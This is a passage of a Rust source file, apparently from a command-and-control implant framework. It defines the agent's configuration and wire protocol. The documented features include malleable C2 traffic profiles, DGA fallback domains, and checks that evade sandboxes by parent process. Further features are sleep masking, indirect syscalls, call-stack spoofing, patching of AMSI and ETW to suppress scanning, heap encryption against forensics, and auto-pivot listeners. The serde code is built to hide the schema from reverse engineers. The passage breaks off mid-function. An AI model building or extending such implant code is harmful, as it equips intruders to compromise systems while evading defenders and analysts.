// src/common.rs
use crate::strcrypt_rt;
use strcrypt::aes_str;
use serde::{Deserialize, Serialize};
use chrono::{DateTime, Utc};
use tokio::sync::{mpsc, oneshot};
use std::net::SocketAddr;
use std::sync::Arc;
use std::collections::HashMap;
use dashmap::DashMap;
use ed25519_dalek::SigningKey;

/// A network interface reported by the agent during registration.
/// Used for topology inference on the server side.
///
/// Serde: positional seq [name, addresses, flags] - no field names in binary.
#[derive(Debug, Clone, Default)]
pub struct NetworkInterface {
    pub name: String,
    /// CIDR-notation addresses, e.g. ["192.168.1.5/24", "fe80::1/64"]
    pub addresses: Vec<String>,
    /// Human-readable interface flags, e.g. ["UP", "RUNNING"]
    pub flags: Vec<String>,
}

/// Serde: u8 variant index (Tls=0, TcpPlain=1, NamedPipe=2, Http=3, Https=4).
#[derive(Debug, Clone, PartialEq)]
pub enum TransportProtocol {
    Tls,
    TcpPlain,
    NamedPipe,
    Http,
    Https,
}

impl Default for TransportProtocol {
    fn default() -> Self { TransportProtocol::Tls }
}

/// Proxy configuration for HTTP(S) transport.
/// Serde: positional seq [use_system, url, username, password].
#[derive(Debug, Clone)]
pub struct ProxyConfig {
    /// Use system proxy settings (default: true)
    pub use_system: bool,
    /// Explicit proxy URL (e.g. "http://proxy.corp.com:8080")
    pub url: String,
    /// Proxy username for Basic/NTLM auth
    pub username: String,
    /// Proxy password
    pub password: String,
}

impl Default for ProxyConfig {
    fn default() -> Self {
        Self {
            use_system: true,
            url: String::new(),
            username: String::new(),
            password: String::new(),
        }
    }
}

fn default_true() -> bool { true }

// [NEW] Transformation Steps for Data
// Serde: seq [tag] for Base64=0 / Hex=1, seq [tag, payload] for
// Mask=2 (Vec<u8>), Prepend=3 (String), Append=4 (String).
#[derive(Debug, Clone)]
pub enum TransformStep {
    Base64,
    Hex,
    Mask(Vec<u8>), // Per-profile XOR key (multi-byte)
    Prepend(String),
    Append(String),
}

// [NEW] HTTP Configuration Block (GET/POST)
// Serde: positional seq [uris, headers, data_transform].
#[derive(Debug, Clone)]
pub struct HttpBlock {
    pub uris: Vec<String>,
    pub headers: HashMap<String, String>,
    pub data_transform: Vec<TransformStep>, // How to process C2 data before sending
}

impl Default for HttpBlock {
    fn default() -> Self {
        HttpBlock {
            uris: vec!["/default".into()],
            headers: HashMap::new(),
            data_transform: vec![],
        }
    }
}

// [NEW] The Malleable Profile Root
// Serde: positional seq [name, user_agent, http_get, http_post, format_http].
#[derive(Debug, Clone)]
pub struct MalleableProfile {
    pub name: String,
    pub user_agent: String,
    pub http_get: HttpBlock,
    pub http_post: HttpBlock,
    // Determines if we strictly enforce HTTP/1.1 formatting over the raw stream
    pub format_http: bool, 
}

impl Default for MalleableProfile {
    fn default() -> Self {
        // The typed config tree has no malleable-profile section; these
        // default strings stay here (gap reported for config-core).
        MalleableProfile {
            name: "default".into(),
            user_agent: "Mozilla/5.0".into(),
            http_get: HttpBlock::default(),
            http_post: HttpBlock::default(),
            format_http: false, // Default is raw TCP
        }
    }
}

// ── Fallback Endpoint Configuration ─────────────────────────────────────

/// A single C2 endpoint the agent can connect to.
/// Serde: positional seq [host, port, transport, profile, proxy, priority,
/// weight, max_failures]; trailing elements fall back to the old serde
/// defaults (transport=tls, profile/proxy=None, priority=0, weight=1,
/// max_failures=5).
#[derive(Debug, Clone)]
pub struct FallbackEndpoint {
    pub host: String,
    pub port: u16,
    pub transport: TransportProtocol,
    /// Optional per-endpoint malleable profile override.
    pub profile: Option<MalleableProfile>,
    /// Optional per-endpoint proxy override.
    pub proxy: Option<ProxyConfig>,
    /// Priority (lower = tried first in Priority/Failover strategies).
    pub priority: u32,
    /// Weight for Random strategy (higher = more likely).
    pub weight: u32,
    /// Mark endpoint dead after this many consecutive failures.
    pub max_failures: u32,
}

fn default_weight() -> u32 { 1 }
fn default_max_failures() -> u32 { 5 }

/// Strategy for selecting which endpoint to try.
/// Serde: u8 variant index (RoundRobin=0, Random=1, Priority=2, Failover=3).
#[derive(Debug, Clone, PartialEq)]
pub enum FallbackStrategy {
    /// Cycle through endpoints in order, looping back to start.
    RoundRobin,
    /// Pick a random endpoint, weighted by `weight` field.
    Random,
    /// Always try lowest-priority first; fall to next on failure.
    Priority,
    /// Use first endpoint until it fails N times, then move to next permanently.
    Failover,
}

impl Default for FallbackStrategy {
    fn default() -> Self { FallbackStrategy::Priority }
}

/// Full fallback configuration.
/// Serde: positional seq [endpoints, strategy, dead_time_secs]; trailing
/// defaults: endpoints=[], strategy=priority, dead_time_secs=300.
#[derive(Debug, Clone, Default)]
pub struct FallbackConfig {
    pub endpoints: Vec<FallbackEndpoint>,
    pub strategy: FallbackStrategy,
    /// Seconds to skip a dead endpoint before retrying it.
    pub dead_time_secs: u64,
}

fn default_dead_time() -> u64 { 300 }


fn default_task_batch_size() -> usize { 10 }

// ── DGA configuration ────────────────────────────────────────────────────────

/// Configuration for the Domain Generation Algorithm.
/// When present in `C2Config.dga`, the agent automatically appends
/// algorithmically-generated C2 domains to its fallback endpoint list.
/// Both the agent and operator compute the same domain list from the same
/// seed, so the operator knows which domains to register before each window.
///
/// Serde: positional seq [seed, window_secs, count, tlds,
/// max_failures_per_domain]; trailing defaults: window=86400, count=16,
/// tlds=[com,net,org], max_failures_per_domain=3.
#[derive(Debug, Clone, PartialEq)]
pub struct DgaConfig {
    /// Per-campaign secret embedded at build time.
    pub seed: u64,
    /// How many seconds each domain set is valid. Default: 86400 (1 day).
    pub window_secs: u64,
    /// Number of domains to generate per window.
    pub count: u32,
    /// TLDs to sample from, e.g. ["com", "net", "org"].
    pub tlds: Vec<String>,
    /// Max consecutive failures before a DGA-generated domain is marked dead.
    pub max_failures_per_domain: u32,
}

fn default_dga_window()       -> u64         { 86400 }
fn default_dga_count()        -> u32         { 16 }
fn default_dga_tlds()         -> Vec<String> { vec!["com".into(), "net".into(), "org".into()] }
fn default_dga_max_failures() -> u32         { 3 }

// ── Evasion / guardrail defaults ─────────────────────────────────────────────

fn default_sleep_mask() -> String { aes_str!("ekko") }

// ─────────────────────────────────────────────────────────────────────────────

/// Serde: positional seq in declaration order; missing trailing elements
/// fall back to the same defaults the old #[serde(default ...)] attributes
/// used. Fields 0-3 (transport, profile, proxy, fallback) and 12-32 have
/// defaults; fields 4-11 (server_public_key .. jitter_max) are required.
#[derive(Debug, Clone)]
pub struct C2Config {
    pub transport: TransportProtocol,
    
    pub profile: MalleableProfile, 

    pub proxy: ProxyConfig,

    /// Fallback endpoints. If empty, `c2_host`/`tunnel_port` is the only endpoint.
    pub fallback: FallbackConfig,

    pub server_public_key: String,
    pub hash_salt: String,
    /// Primary endpoint host (always used as first fallback if fallback.endpoints is empty).
    pub c2_host: String,
    pub build_id: String,
    /// Primary endpoint port.
    pub tunnel_port: u16,
    pub sleep_interval: u64,
    pub jitter_min: u32,
    pub jitter_max: u32,
    pub bloat_mb: u64,
    pub debug: bool,
    pub kill_date: Option<i64>,
    /// Per-build shared secret for handshake authentication (base64).
    /// Agent proves knowledge of this key via HMAC during session setup.
    pub challenge_key: String,
    /// SNI hostname to advertise in the TLS ClientHello, overriding c2_host.
    /// The actual TCP connection still goes to c2_host:tunnel_port.
    /// Set to a CDN or cloud hostname to blend with normal TLS traffic.
    pub sni_override: Option<String>,
    /// ALPN protocols to advertise in the TLS ClientHello.
    /// Safe default: ["http/1.1"]. Do not advertise "h2" unless you speak HTTP/2.
    pub alpn_protocols: Vec<String>,
    /// When true the agent operates in hibernation mode: connect, claim a
    /// batch of queued tasks, execute, disconnect, sleep - never persists.
    pub hibernation_mode: bool,
    /// Maximum tasks claimed per hibernation check-in. Default 10.
    pub task_batch_size: usize,
    /// Optional Domain Generation Algorithm config. When set, the agent generates
    /// additional C2 hostnames each window as low-priority fallback endpoints.
    pub dga: Option<DgaConfig>,

    /// Allowlist of parent process image names that are considered legitimate
    /// spawn paths for this build (e.g. ["explorer.exe", "svchost.exe"]).
    ///
    /// At startup the agent resolves its own parent via NtQueryInformationProcess
    /// and QueryFullProcessImageNameW. If the parent's filename is NOT in this
    /// list, the agent runs the decoy routine and exits.
    ///
    /// Rationale: sandbox/detonation environments and analysis tools almost
    /// always have anomalous parent chains. Knowing the expected delivery
    /// path at build time (e.g. a dropper spawned from Word, or a service
    /// installed via svchost) lets you bake a lightweight, zero-noise check
    /// directly into the binary.
    ///
    /// Leave empty (default) to disable - the check is a no-op when the
    /// list is empty, so existing configs need no changes.
    pub valid_parents: Vec<String>,

    // ── Evasion ───────────────────────────────────────────────────────────────
    //
    // All evasion fields default to the most aggressive safe values so that
    // legacy configs (built before this feature existed) get full evasion
    // without any config migration.

    /// Sleep masking algorithm to use during beacon sleep windows.
    /// "ekko"    - Ekko ROP-based timer-masked sleep (Windows only; no-op on Linux).
    /// "foliage" - Foliage APC-based sleep mask (Windows only; no-op on Linux).
    /// "none"    - Plain Sleep/usleep; no masking.
    pub sleep_mask: String,

    /// Use indirect syscall stubs (Heaven's Gate / SysWhispers-style) instead
    /// of calling ntdll exports directly. Reduces userland hook surface.
    /// Windows only; no-op on Linux/macOS.
    pub indirect_syscalls: bool,

    /// Spoof the thread call-stack to a plausible kernel32/ntdll frame chain
    /// before every sleep, then restore it on wake. Defeats stack-walking
    /// heuristics in memory scanners.
    /// Windows only; no-op on Linux/macOS.
    pub stack_spoof: bool,

    /// Byte-patch AMSI (amsi.dll!AmsiScanBuffer) and ETW
    /// (ntdll!EtwEventWrite) on startup to suppress scan and telemetry hooks.
    /// Windows only; no-op on Linux/macOS.
    pub patch_amsi_etw: bool,

    /// Encrypt the process heap with AES-256-GCM while the agent is sleeping,
    /// then decrypt on wake. Defeats heap-scanning memory forensics.
    /// Windows only; no-op on Linux/macOS.
    pub heap_encrypt: bool,

    // ── Execution guardrails ──────────────────────────────────────────────────
    //
    // All guardrail fields default to permissive (empty / 0 / false) so that
    // existing configs remain unaffected.

    /// Glob pattern the AD domain name must match at runtime (case-insensitive).
    /// e.g. "CORP*" or "*.example.com".
    /// Empty string (default) disables the check - agent runs on any domain.
    pub guard_domain: String,

    /// Glob pattern the machine hostname must match at runtime (case-insensitive).
    /// e.g. "DESKTOP-*" or "WKS??".
    /// Empty string (default) disables the check - agent runs on any hostname.
    pub guard_hostname: String,

    /// Hour of day (0-23, local time) before which the agent must not run.
    /// Together with `guard_hour_end` this forms an active-hours window.
    /// Both 0 (default) disables the time-window check entirely.
    pub guard_hour_start: u8,

    /// Hour of day (0-23, local time) after which the agent must not run.
    /// Together with `guard_hour_start` this forms an active-hours window.
    /// Both 0 (default) disables the time-window check entirely.
    pub guard_hour_end: u8,

    /// When true the agent exits immediately if it detects it is running as
    /// SYSTEM (Windows) or UID 0 / root (Linux/macOS). Useful for builds
    /// that are not expected to be elevated and want to avoid sandbox traps.
    pub guard_no_system: bool,

    // ── Pivot auto-cascade ────────────────────────────────────────────────────

    /// When set, the agent automatically starts a TCP pivot listener on this
    /// port immediately after a successful session handshake completes.
    ///
    /// Use this to pre-wire multi-hop chains at build time without requiring
    /// the operator to manually issue pivot:listener_tcp on each intermediate
    /// hop after it connects.
    ///
    /// Example 4-hop chain:
    ///   hop1 agent: auto_pivot_port = None (direct session; operator starts
    ///               its listener manually with: pivot:listener_tcp 5001)
    ///   hop2 agent: auto_pivot_port = Some(5002) ← starts :5002 on connect
    ///   hop3 agent: auto_pivot_port = Some(5003) ← starts :5003 on connect
    ///   hop4 agent: auto_pivot_port = None ← leaf node, no downstream
    ///
    /// The listener starts in a detached background task immediately after the
    /// handshake completes, so it is ready before downstream agents reach their
    /// first reconnect attempt (assuming a reasonable initial_delay / retry
    /// window in the downstream fallback profile).
    ///
    /// Leave as None (default) to disable - the check is a no-op and existing
    /// configs need no changes.
    pub auto_pivot_port: Option<u16>,
}

// ... (Rest of common.rs remains the same: ClientHello, SecuredCommand, etc.)
/// Serde: positional seq [hostname, os, computer_id, exe_id, build_id,
/// auth_hmac, reg_timestamp, interfaces, hibernation_mode, task_batch_size].
#[derive(Debug)]
pub struct ClientHello {
    pub hostname: String,
    pub os: String,
    pub computer_id: String,
    pub exe_id: String,
    pub build_id: String,
    /// HMAC-SHA256(challenge_key, build_id || exe_id || reg_timestamp) - proves
    /// agent has the build secret. Includes a timestamp to prevent replay attacks.
    /// Empty string for legacy builds without challenge_key.
    pub auth_hmac: String,
    /// ISO-8601 registration timestamp included in the HMAC to prevent replays.
    pub reg_timestamp: String,
    /// Network interfaces reported for topology inference.
    pub interfaces: Vec<NetworkInterface>,
    /// Agent is operating in hibernation mode (connect -> tasks -> disconnect -> sleep).
    pub hibernation_mode: bool,
    /// Maximum tasks to claim per hibernation check-in.
    pub task_batch_size: usize,
}

/// Server sends this after receiving ClientHello to prove it holds the
/// signing key and to challenge the agent to prove it has the build secret.
/// Serde: positional seq [nonce, server_proof].
#[derive(Debug)]
pub struct HandshakeChallenge {
    pub nonce: String,           // Random 32-byte hex
    pub server_proof: String,    // ed25519 signature of nonce (proves server has private key)
}

/// Agent responds with HMAC proof that it holds the challenge_key.
/// Serde: positional seq [hmac].
#[derive(Debug)]
pub struct HandshakeResponse {
    pub hmac: String, // HMAC-SHA256(challenge_key, nonce || build_id), base64
}

/// Serde: positional seq [session_id, counter, nonce, timestamp (RFC3339
/// string), command, signature].
#[derive(Debug)]
pub struct SecuredCommand {
    pub session_id: String,
    pub counter: u64,
    pub nonce: u64,
    pub timestamp: DateTime<Utc>,
    pub command: String,
    pub signature: String,
}

impl SecuredCommand {
    pub fn get_signable_bytes(&self) -> Vec<u8> {
        format!("{}:{}:{}:{}:{}", 
            self.session_id, self.counter, self.nonce, 
            self.timestamp.to_rfc3339(), self.command
        ).into_bytes()
    }
}

/// Serde: positional seq [request_id, output, error, exit_code].
#[derive(Debug, Clone)]
pub struct CommandResponse {
    pub request_id: u64,
    pub output: String,
    pub error: String,
    pub exit_code: i32,
}

/// Serde: positional seq [stream_id, destination, source, data, metadata].
#[derive(Debug, Clone)]
pub struct PivotFrame {
    pub stream_id: u32,
    pub destination: u32,
    pub source: u32,
    pub data: Vec<u8>,
    pub metadata: String,
}

// ── Manual SEQ-based serde impls (no field names in the binary) ─────────────
//
// Every type that crosses the agent wire or is embedded in the agent binary
// serializes as a positional sequence in struct declaration order (enums as
// a u8 variant index). Derived serde would embed every field/variant name as
// a static string, leaking the whole schema into the release binary.
//
// Deserialization contract: elements are read in the SAME order; missing
// trailing elements fall back to the SAME defaults the old
// #[serde(default = ...)] attributes used; a missing element with no default
// is an error ("truncated"). Expecting strings are deliberately generic so
// serde error messages don't leak type names either.

use serde::ser::SerializeSeq;
use serde::de::{self, SeqAccess, Visitor};
use std::fmt;

fn truncated<E: de::Error>() -> E { de::Error::custom("truncated") }
fn bad_variant<E: de::Error>() -> E { de::Error::custom("bad variant") }

impl Serialize for NetworkInterface {
    fn serialize<S: serde::Serializer>(&self, serializer: S) -> Result<S::Ok, S::Error> {
        let mut seq = serializer.serialize_seq(None)?;
        seq.serialize_element(&self.name)?;
        seq.serialize_element(&self.addresses)?;
        seq.serialize_element(&self.flags)?;
        seq.end()
    }
}

impl<'de> Deserialize<'de> for NetworkInterface {
    fn deserialize<D: serde::Deserializer<'de>>(deserializer: D) -> Result<Self, D::Error> {
        struct V;
        impl<'de> Visitor<'de> for V {
            type Value = NetworkInterface;
            fn expecting(&self, f: &mut fmt::Formatter) -> fmt::Result { f.write_str("seq") }
            fn visit_seq<A: SeqAccess<'de>>(self, mut s: A) -> Result<Self::Value, A::Error> {
                Ok(NetworkInterface {
                    name: s.next_element()?.ok_or_else(truncated)?,
                    addresses: s.next_element()?.ok_or_else(truncated)?,
                    flags: s.next_element()?.ok_or_else(truncated)?,
                })
            }
        }
        deserializer.deserialize_seq(V)
    }
}

impl Serialize for TransportProtocol {
    fn serialize<S: serde::Serializer>(&self, serializer: S) -> Result<S::Ok, S::Error> {
        serializer.serialize_u8(match self {
            TransportProtocol::Tls => 0,
            TransportProtocol::TcpPlain => 1,
            TransportProtocol::NamedPipe => 2,
            TransportProtocol::Http => 3,
            TransportProtocol::Https => 4,
        })
    }
}

impl<'de> Deserialize<'de> for TransportProtocol {
    fn deserialize<D: serde::Deserializer<'de>>(deserializer: D) -> Result<Self, D::Error> {
        struct V;
        impl<'de> Visitor<'de> for V {
            type Value = TransportProtocol;
            fn expecting(&self, f: &mut fmt::Formatter) -> fmt::Result { f.write_str("u8") }
            fn visit_u8<E: de::Error>(self, v: u8) -> Result<Self::Value, E> {
                Ok(match v {
                    0 => TransportProtocol::Tls,
                    1 => TransportProtocol::TcpPlain,
                    2 => TransportProtocol::NamedPipe,
                    3 => TransportProtocol::Http,
                    4 => TransportProtocol::Https,
                    _ => return Err(bad_variant()),
                })
            }
            fn visit_u64<E: de::Error>(self, v: u64) -> Result<Self::Value, E> {
                if v <= u8::MAX as u64 { self.visit_u8(v as u8) } else { Err(bad_variant()) }
            }
            fn visit_i64<E: de::Error>(self, v: i64) -> Result<Self::Value, E> {
                if v >= 0 && v <= u8::MAX as i64 { self.visit_u8(v as u8) } else { Err(bad_variant()) }
            }
        }
        deserializer.deserialize_u8(V)
    }
}

impl Serialize for ProxyConfig {
    fn serialize<S: serde::Serializer>(&self, serializer: S) -> Result<S::Ok, S::Error> {
        let mut seq = serializer.serialize_seq(None)?;
        seq.serialize_element(&self.use_system)?;
        seq.serialize_element(&self.url)?;
        seq.serialize_element(&self.username)?;
        seq.serialize_element(&self.password)?;
        seq.end()
    }
}

impl<'de> Deserialize<'de> for ProxyConfig {
    fn deserialize<D: serde::Deserializer<'de>>(deserializer: D) -> Result<Self, D::Error> {
        struct V;
        impl<'de> Visitor<'de> for V {
            type Value = ProxyConfig;
            fn expecting(&self, f: &mut fmt::Formatter) -> fmt::Result { f.write_str("seq") }
            fn visit_seq<A: SeqAccess<'de>>(self, mut s: A) -> Result<Self::Value, A::Error> {
                Ok(ProxyConfig {
                    use_system: s.next_element()?.unwrap_or_else(default_true),
                    url: s.next_element()?.unwrap_or_default(),
                    username: s.next_element()?.unwrap_or_default(),
                    password: s.next_element()?.unwrap_or_default(),
                })
            }
        }
        deserializer.deserialize_seq(V)
    }
}

impl Serialize for TransformStep {
    fn serialize<S: serde::Serializer>(&self, serializer: S) -> Result<S::Ok, S::Error> {
        let mut seq = serializer.serialize_seq(None)?;
        match self {
            TransformStep::Base64 => { seq.serialize_element(&0u8)?; }
            TransformStep::Hex => { seq.serialize_element(&1u8)?; }
            TransformStep::Mask(key) => {
                seq.serialize_element(&2u8)?;
                seq.serialize_element(key)?;
            }
            TransformStep::Prepend(p) => {
                seq.serialize_element(&3u8)?;
                seq.serialize_element(p)?;
            }
            TransformStep::Append(p) => {
                seq.serialize_element(&4u8)?;
                seq.serialize_element(p)?;
            }
        }
        seq.end()
    }
}

impl<'de> Deserialize<'de> for TransformStep {
    fn deserialize<D: serde::Deserializer<'de>>(deserializer: D) -> Result<Self, D::Error> {
        struct V;
        impl<'de> Visitor<'de> for V {
            type Value = TransformStep;
            fn expecting(&self, f: &mut fmt::Formatter) -> fmt::Result { f.write_str("seq") }
            fn visit_seq<A: SeqAccess<'de>>(self, mut s: A) -> Result<Self::Value, A::Error> {
                let tag: u8 = s.next_element()?.ok_or_else(truncated)?;
                Ok(match tag {
                    0 => TransformStep::Base64,
                    1 => TransformStep::Hex,
                    2 => TransformStep::Mask(s.next_element()?.ok_or_else(truncated)?),
                    3 => TransformStep::Prepend(s.next_element()?.ok_or_else(truncated)?),
                    4 => TransformStep::Append(s.next_element()?.ok_or_else(truncated)?),
                    _ => return Err(bad_variant()),
                })
            }
        }
        deserializer.deserialize_seq(V)
    }
}

impl Serialize for HttpBlock {
    fn serialize<S: serde::Serializer>(&self, serializer: S) -> Result<S::Ok, S::Error> {
        let mut seq = serializer.serialize_seq(None)?;
        seq.serialize_element(&self.uris)?;
        seq.serialize_element(&self.headers)?;
        seq.serialize_element(&self.data_transform)?;
        seq.end()
    }
}

impl<'de> Deserialize<'de> for HttpBlock {
    fn deserialize<D: serde::Deserializer<'de>>(deserializer: D) -> Result<Self, D::Error> {
        struct V;
        impl<'de> Visitor<'de> for V {
            type Value = HttpBlock;
            fn expecting(&self, f: &mut fmt::Formatter) -> fmt::Result { f.write_str("seq") }
            fn visit_seq<A: SeqAccess<'de>>(self, mut s: A) -> Result<Self::Value, A::Error> {
                Ok(HttpBlock {
                    uris: s.next_element()?.ok_or_else(truncated)?,
                    headers: s.next_element()?.ok_or_else(truncated)?,
                    data_transform: s.next_element()?.ok_or_else(truncated)?,
                })
            }
        }
        deserializer.deserialize_seq(V)
    }
}

impl Serialize for MalleableProfile {
    fn serialize<S: serde::Serializer>(&self, serializer: S) -> Result<S::Ok, S::Error> {
        let mut seq = serializer.serialize_seq(None)?;
        seq.serialize_element(&self.name)?;
        seq.serialize_element(&self.user_agent)?;
        seq.serialize_element(&self.http_get)?;
        seq.serialize_element(&self.http_post)?;
        seq.serialize_element(&self.format_http)?;
        seq.end()
    }
}

impl<'de> Deserialize<'de> for MalleableProfile {
    fn deserialize<D: serde::Deserializer<'de>>(deserializer: D) -> Result<Self, D::Error> {
        struct V;
        impl<'de> Visitor<'de> for V {
            type Value = MalleableProfile;
            fn expecting(&self, f: &mut fmt::Formatter) -> fmt::Result { f.write_str("seq") }
            fn visit_seq<A: SeqAccess<'de>>(self, mut s: A) -> Result<Self::Value, A::Error> {
                Ok(MalleableProfile {
                    name: s.next_element()?.ok_or_else(truncated)?,
                    user_agent: s.next_element()?.ok_or_else(truncated)?,
                    http_get: s.next_element()?.ok_or_else(truncated)?,
                    http_post: s.next_element()?.ok_or_else(truncated)?,
                    format_http: s.next_element()?.ok_or_else(truncated)?,
                })
            }
        }
        deserializer.deserialize_seq(V)
    }
}

impl Serialize for FallbackEndpoint {
    fn serialize<S: serde::Serializer>(&self, serializer: S) -> Result<S::Ok, S::Error> {
        let mut seq = serializer.serialize_seq(None)?;
        seq.serialize_element(&self.host)?;
        seq.serialize_element(&self.port)?;
        seq.serialize_element(&self.transport)?;
        seq.serialize_element(&self.profile)?;
        seq.serialize_element(&self.proxy)?;
        seq.serialize_element(&self.priority)?;
        seq.serialize_element(&self.weight)?;
        seq.serialize_element(&self.max_failures)?;
        seq.end()
    }
}

impl<'de> Deserialize<'de> for FallbackEndpoint {
    fn deserialize<D: serde::Deserializer<'de>>(deserializer: D) -> Result<Self, D::Error> {
        struct V;
        impl<'de> Visitor<'de> for V {
            type Value = FallbackEndpoint;
            fn expecting(&self, f: &mut fmt::Formatter) -> fmt::Result { f.write_str("seq") }
            fn visit_seq<A: SeqAccess<'de>>(self, mut s: A) -> Result<Self::Value, A::Error> {
                Ok(FallbackEndpoint {
                    host: s.next_element()?.ok_or_else(truncated)?,
                    port: s.next_element()?.ok_or_else(truncated)?,
                    transport: s.next_element()?.unwrap_or_default(),
                    profile: s.next_element()?.unwrap_or_default(),
                    proxy: s.next_element()?.unwrap_or_default(),
                    priority: s.next_element()?.unwrap_or_default(),
                    weight: s.next_element()?.unwrap_or_else(default_weight),
                    max_failures: s.next_element()?.unwrap_or_else(default_max_failures),
                })
            }
        }
        deserializer.deserialize_seq(V)
    }
}

impl Serialize for FallbackStrategy {
    fn serialize<S: serde::Serializer>(&self, serializer: S) -> Result<S::Ok, S::Error> {
        serializer.serialize_u8(match self {
            FallbackStrategy::RoundRobin => 0,
            FallbackStrategy::Random => 1,
            FallbackStrategy::Priority => 2,
            FallbackStrategy::Failover => 3,
        })
    }
}

impl<'de> Deserialize<'de> for FallbackStrategy {
    fn deserialize<D: serde::Deserializer<'de>>(deserializer: D) -> Result<Self, D::Error> {
        struct V;
        impl<'de> Visitor<'de> for V {
            type Value = FallbackStrategy;
            fn expecting(&self, f: &mut fmt::Formatter) -> fmt::Result { f.write_str("u8") }
            fn visit_u8<E: de::Error>(self, v: u8) -> Result<Self::Value, E> {
                Ok(match v {
                    0 => FallbackStrategy::RoundRobin,
                    1 => FallbackStrategy::Random,
                    2 => FallbackStrategy::Priority,
                    3 => FallbackStrategy::Failover,
                    _ => return Err(bad_variant()),
                })
            }
            fn visit_u64<E: de::Error>(self, v: u64) -> Result<Self::Value, E> {
                if v <= u8::MAX as u64 { self.visit_u8(v as u8) } else { Err(bad_variant()) }
            }
            fn visit_i64<E: de::Error>(self, v: i64) -> Result<Self::Value, E> {
                if v >= 0 && v <= u8::MAX as i64 { self.visit_u8(v as u8) } else { Err(bad_variant()) }
            }
        }
        deserializer.deserialize_u8(V)
    }
}

impl Serialize for FallbackConfig {
    fn serialize<S: serde::Serializer>(&self, serializer: S) -> Result<S::Ok, S::Error> {
        let mut seq = serializer.serialize_seq(None)?;
        seq.serialize_element(&self.endpoints)?;
        seq.serialize_element(&self.strategy)?;
        seq.serialize_element(&self.dead_time_secs)?;
        seq.end()
    }
}

impl<'de> Deserialize<'de> for FallbackConfig {
    fn deserialize<D: serde::Deserializer<'de>>(deserializer: D) -> Result<Self, D::Error> {
        struct V;
        impl<'de> Visitor<'de> for V {
            type Value = FallbackConfig;
            fn expecting(&self, f: &mut fmt::Formatter) -> fmt::Result { f.write_str("seq") }
            fn visit_seq<A: SeqAccess<'de>>(self, mut s: A) -> Result<Self::Value, A::Error> {
                Ok(FallbackConfig {
                    endpoints: s.next_element()?.unwrap_or_default(),
                    strategy: s.next_element()?.unwrap_or_default(),
                    dead_time_secs: s.next_element()?.unwrap_or_else(default_dead_time),
                })
            }
        }
        deserializer.deserialize_seq(V)
    }
}

impl Serialize for DgaConfig {
    fn serialize<S: serde::Serializer>(&self, serializer: S) -> Result<S::Ok, S::Error> {
        let mut seq = serializer.serialize_seq(None)?;
        seq.serialize_element(&self.seed)?;
        seq.serialize_element(&self.window_secs)?;
        seq.serialize_element(&self.count)?;
        seq.serialize_element(&self.tlds)?;
        seq.serialize_element(&self.max_failures_per_domain)?;
        seq.end()
    }
}

impl<'de> Deserialize<'de> for DgaConfig {
    fn deserialize<D: serde::Deserializer<'de>>(deserializer: D) -> Result<Self, D::Error> {
        struct V;
        impl<'de> Visitor<'de> for V {
            type Value = DgaConfig;
            fn expecting(&self, f: &mut fmt::Formatter) -> fmt::Result { f.write_str("seq") }
            fn visit_seq<A: SeqAccess<'de>>(self, mut s: A) -> Result<Self::Value, A::Error> {
                Ok(DgaConfig {
                    seed: s.next_element()?.ok_or_else(truncated)?,
                    window_secs: s.next_element()?.unwrap_or_else(default_dga_window),
                    count: s.next_element()?.unwrap_or_else(default_dga_count),
                    tlds: s.next_element()?.unwrap_or_else(default_dga_tlds),
                    max_failures_per_domain: s.next_element()?.unwrap_or_else(default_dga_max_failures),
                })
            }
        }
        deserializer.deserialize_seq(V)
    }
}

impl Serialize for C2Config {
    fn serialize<S: serde::Serializer>(&self, serializer: S) -> Result<S::Ok, S::Error> {
        let mut seq = serializer.serialize_seq(None)?;
        seq.serialize_element(&self.transport)?;
        seq.serialize_element(&self.profile)?;
        seq.serialize_element(&self.proxy)?;
        seq.serialize_element(&self.fallback)?;
        seq.serialize_element(&self.server_public_key)?;
        seq.serialize_element(&self.hash_salt)?;
        seq.serialize_element(&self.c2_host)?;
        seq.serialize_element(&self.build_id)?;
        seq.serialize_element(&self.tunnel_port)?;
        seq.serialize_element(&self.sleep_interval)?;
        seq.serialize_element(&self.jitter_min)?;
        seq.serialize_element(&self.jitter_max)?;
        seq.serialize_element(&self.bloat_mb)?;
        seq.serialize_element(&self.debug)?;
        seq.serialize_element(&self.kill_date)?;
        seq.serialize_element(&self.challenge_key)?;
        seq.serialize_element(&self.sni_override)?;
        seq.serialize_element(&self.alpn_protocols)?;
        seq.serialize_element(&self.hibernation_mode)?;
        seq.serialize_element(&self.task_batch_size)?;
        seq.serialize_element(&self.dga)?;
        seq.serialize_element(&self.valid_parents)?;
        seq.serialize_element(&self.sleep_mask)?;
        seq.serialize_element(&self.indirect_syscalls)?;
        seq.serialize_element(&self.stack_spoof)?;
        seq.serialize_element(&self.patch_amsi_etw)?;
        seq.serialize_element(&self.heap_encrypt)?;
        seq.serialize_element(&self.guard_domain)?;
        seq.serialize_element(&self.guard_hostname)?;
        seq.serialize_element(&self.guard_hour_start)?;
        seq.serialize_element(&self.guard_hour_end)?;
        seq.serialize_element(&self.guard_no_system)?;
        seq.serialize_element(&self.auto_pivot_port)?;
        seq.end()
    }
}

impl<'de> Deserialize<'de> for C2Config {
    fn deserialize<D: serde::Deserializer<'de>>(deserializer: D) -> Result<Self, D::Error> {
        struct V;
        impl<'de> Visitor<'de> for V {
            type Value = C2Config;
            fn expecting(&self, f: &mut fmt::Formatter) -> fmt::Result { f.write_str("seq") }
            fn visit_seq<A: SeqAccess<'de>>(self, mut s: A) -> Result<Self::Value, A::Error> {
                Ok(C2Config {
                    transport: s.next_element()?.unwrap_or_default(),
                    profile: s.next_element()?.unwrap_or_default(),
                    proxy: s.next_element()?.unwrap_or_default(),
                    fallback: s.next_element()?.unwrap_or_default(),
                    server_public_key: s.next_element()?.ok_or_else(truncated)?,
                    hash_salt: s.next_element()?.ok_or_else(truncated)?,
                    c2_host: s.next_element()?.ok_or_else(truncated)?,
                    build_id: s.next_element()?.ok_or_else(truncated)?,
                    tunnel_port: s.next_element()?.ok_or_else(truncated)?,
                    sleep_interval: s.next_element()?.ok_or_else(truncated)?,
                    jitter_min: s.next_element()?.ok_or_else(truncated)?,
                    jitter_max: s.next_element()?.ok_or_else(truncated)?,
                    bloat_mb: s.next_element()?.unwrap_or_default(),
                    debug: s.next_element()?.unwrap_or_default(),
                    kill_date: s.next_element()?.unwrap_or_default(),
                    challenge_key: s.next_element()?.unwrap_or_default(),
                    sni_override: s.next_element()?.unwrap_or_default(),
                    alpn_protocols: s.next_element()?.unwrap_or_default(),
                    hibernation_mode: s.next_element()?.unwrap_or_default(),
